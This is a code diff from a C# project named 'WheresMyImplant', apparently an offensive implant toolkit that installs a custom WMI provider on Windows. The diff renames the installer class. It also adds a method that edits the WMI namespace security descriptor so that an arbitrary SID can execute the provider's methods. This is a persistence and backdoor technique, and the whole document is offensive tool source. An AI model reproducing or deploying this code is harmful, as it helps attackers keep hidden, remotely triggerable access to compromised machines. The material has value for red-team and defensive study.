@@ -9,7 +9,7 @@ using Microsoft.Win32;
 
 namespace WheresMyImplant
 {
-    class Install : Base
+    class InstallWMI : Base
     {
         String statusMethods;
         String statusRegistry;
@@ -34,7 +34,7 @@ namespace WheresMyImplant
         private Assembly assembly = Assembly.GetExecutingAssembly();
         private AssemblyName systemManagementName;
 
-        internal Install(String system, String namespaceName, String providerDisplayName)
+        internal InstallWMI(String system, String namespaceName, String providerDisplayName)
         {
             this.system = system;
             this.namespaceName = namespaceName;
@@ -253,6 +253,28 @@ namespace WheresMyImplant
             ManagementClass parameters = (ManagementClass)__PARAMETERS.Clone();
             parameters.Qualifiers.Add(direction, true);
             return parameters;
+        }
+
+        internal void SetPermissions(String sid)
+        {
+            WMI wmi = new WMI();
+            ManagementObject trusteeInstance = wmi.CreateInstance("Win32_Trustee");
+            trusteeInstance["SidString"] = sid;
+
+            ManagementObject aceInstance = wmi.CreateInstance("Win32_ACE");
+            aceInstance["AceFlags"] = (uint)WMI.AceFlags.CONTAINER_INHERIT_ACE_FLAG + (uint)WMI.AceFlags.OBJECT_INHERIT_ACE_FLAG;
+            aceInstance["AccessMask"] = WMI.AccessMask.WBEM_METHOD_EXECUTE;
+            aceInstance["AceType"] = WMI.AceType.ACCESS_ALLOWED_ACE_TYPE;
+            aceInstance["Trustee"] = trusteeInstance;
+
+            ManagementBaseObject aclInstance = (ManagementBaseObject)wmi.ExecuteMethod2("__SystemSecurity", "GetSecurityDescriptor", new Object[] { });
+            ManagementBaseObject descriptor = aclInstance.Properties["Descriptor"].Value as ManagementBaseObject;
+            ManagementBaseObject[] dacl = descriptor["DACL"] as ManagementBaseObject[];
+            Array.Resize(ref dacl, dacl.Length + 1);
+            dacl[dacl.Length - 1] = aceInstance;
+            descriptor["DACL"] = dacl;
+
+            wmi.ExecuteMethod("__SystemSecurity", "SetSecurityDescriptor", new Object[] { descriptor });
         }
     }
 }
